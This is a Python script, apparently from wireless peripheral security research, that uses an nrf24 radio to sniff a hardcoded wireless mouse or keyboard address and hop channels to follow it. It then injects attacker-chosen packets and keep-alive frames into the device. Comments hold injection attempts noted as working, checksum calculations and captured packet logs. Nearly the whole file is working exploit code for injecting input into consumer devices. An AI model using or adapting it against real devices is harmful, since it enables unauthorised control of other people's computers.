#!/usr/bin/env python

import sys, time, array, binascii, logging
from lib.nrf24 import *

address = '\x07\x16\x91\xc9\x1f'
address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])
payload = sys.argv[1]
#keep_alive = '\x00\x40\x00\x08\xB8'
#keep_alive = '\x40\x00\x08\xB8\x00\x00\x00\x00\x3B'
keep_alive = sys.argv[2]

logging.basicConfig(level=10, format='[%(asctime)s.%(msecs)03d]  %(message)s', datefmt="%Y-%m-%d %H:%M:%S")

radio = nrf24()
radio.enable_lna()
radio.enter_sniffer_mode(address)

timeout = float(250) / float(1000)
ping_payload = '\x0F\x0F\x0F\x0F'

ack_timeout = 1
retries = 5
last_ping = time.time()

def do_stuff():
  print radio.transmit_payload(payload, 1, 5)
  print radio.transmit_payload(keep_alive, 1, 5)
  print radio.transmit_payload(keep_alive, 1, 5)
  print radio.transmit_payload(keep_alive, 1, 5)

while True:
  # Follow the target device if it changes channels
  if time.time() - last_ping > timeout:

    # First try pinging on the active channel
    if not radio.transmit_payload(ping_payload, ack_timeout, retries):

      # Ping failed on the active channel, so sweep through all available channels
      success = False
      for channel_index in range(2, 84):
        radio.set_channel(channel_index)
        if radio.transmit_payload(ping_payload, ack_timeout, retries):

          logging.debug('Swapping to channel: {0}'.format(channel_index))
          for i in range(0, 1):
            do_stuff()
          last_ping = time.time()
          success = True
          break

      # Ping sweep failed
      if not success: logging.debug('Unable to ping {0}'.format(address_string))

    # Ping succeeded on the active channel
    else:
      logging.debug('Ping success on channel {0}'.format(channel_index))
      for i in range(0, 1):
        do_stuff()
      last_ping = time.time()

  # # Payload checksum
  # cksum = 0xFF
  # for n in range(0, len(data)):
  #   cksum -= data[n]
  #   cksum += 1
  # hex(cksum) # '0x3e'


# for i in range(0, 1):
#     #print radio.transmit_payload('\x00\x40\x00\x08\xB8', 1, 5)
#     # '\x00\xC2\x02\x00\x00\x00\x00\x00\x00\x3C' == payload
#     print radio.transmit_payload(payload, 1, 5) # \x02 right click? 0x3C checksum
#     print radio.transmit_payload('\x00\x40\x00\x08\xB8', 1, 5)
#     print radio.transmit_payload('\x00\x40\x00\x08\xB8', 1, 5)
#     print radio.transmit_payload('\x00\xC2\x01\x00\x00\x00\x00\x00\x00\x3D', 1, 5) #works

    # Interesting packets
    #[2016-03-03 16:03:59.426]  44  10  1F:C9:91:16:07  00:C2:00:00:00:00:00:00:00:3E
    #[2016-03-03 16:37:01.488]   8  10  1F:C9:91:16:07  00:10:07:05:02:00:00:00:00:E2
    #[2016-03-03 16:35:26.617]   8   9  1F:C9:91:16:07  00:C0:05:18:A7:3A:DB:2F:FF #probs nothing
    #[2016-03-03 16:35:01.475]   8  10  1F:C9:91:16:07  00:10:07:05:02:00:00:00:3B:A7

    # [2016-03-03 16:33:55.431]   8  22  1F:C9:91:16:07  00:D3:09:93:53:4A:D8:EF:19:B8:A6:59:56:39:00:00:00:00:00:00:00:CE
    # [2016-03-03 16:33:55.432]   8  22  1F:C9:91:16:07  00:40:00:08:B8:C0:D6:05:89:5E:A6:59:56:38:00:00:00:00:00:00:00:90
    # [2016-03-03 16:33:55.439]   8  22  1F:C9:91:16:07  00:40:00:08:B8:99:83:B4:96:DF:A6:59:56:37:00:00:00:00:00:00:00:1D
    # [2016-03-03 16:33:55.447]   8  10  1F:C9:91:16:07  00:4F:00:01:18:00:00:00:00:98
    # [2016-03-03 16:33:55.447]   8  10  1F:C9:91:16:07  00:40:00:08:B8:C0:D6:05:89:5E
    # [2016-03-03 16:33:55.546]   8  22  1F:C9:91:16:07  00:D3:80:CF:73:0B:75:3E:E0:AE:A6:59:56:3A:00:00:00:00:00:00:00:90
    # [2016-03-03 16:33:55.547]   8  22  1F:C9:91:16:07  00:4F:00:01:18:00:00:00:00:98:A6:59:56:39:00:00:00:00:00:00:00:CE
    # [2016-03-03 16:33:55.553]   8   5  1F:C9:91:16:07  00:40:00:08:B8
    # [2016-03-03 16:33:55.554]   8   5  1F:C9:91:16:07  00:D3:80:CF:73
    # [2016-03-03 16:33:55.561]   8   5  1F:C9:91:16:07  00:4F:00:01:18
    # [2016-03-03 16:33:55.569]   8   5  1F:C9:91:16:07  00:40:00:08:B8
    # [2016-03-03 16:33:55.570]   8   5  1F:C9:91:16:07  00:D3:80:CF:73
    # [2016-03-03 16:33:55.585]   8   5  1F:C9:91:16:07  00:40:00:08:B8
    # [2016-03-03 16:33:55.586]   8   5  1F:C9:91:16:07  00:40:00:08:B8
    # [2016-03-03 16:33:55.634]   8  22  1F:C9:91:16:07  00:D3:B1:9D:51:B2:17:5D:1D:20:A6:59:56:3B:00:00:00:00:00:00:00:9B
    # [2016-03-03 16:33:55.635]   8  22  1F:C9:91:16:07  00:40:00:08:B8:0B:75:3E:E0:AE:A6:59:56:3A:00:00:00:00:00:00:00:90
    # [2016-03-03 16:33:55.642]   8  22  1F:C9:91:16:07  00:40:00:08:B8:00:00:00:00:98:A6:59:56:39:00:00:00:00:00:00:00:CE
    # [2016-03-03 16:33:55.650]   8  10  1F:C9:91:16:07  00:4F:00:01:18:00:00:00:00:98
    # [2016-03-03 16:33:55.651]   8  10  1F:C9:91:16:07  00:40:00:08:B8:0B:75:3E:E0:AE

    # [2016-03-04 21:39:33.315]  17  10  1F:C9:91:16:07  00:4F:03:00:00:00:00:00:00:AE
    # [2016-03-04 21:39:33.316]  17  10  1F:C9:91:16:07  00:40:01:18:A7:BD:ED:65:8B:A7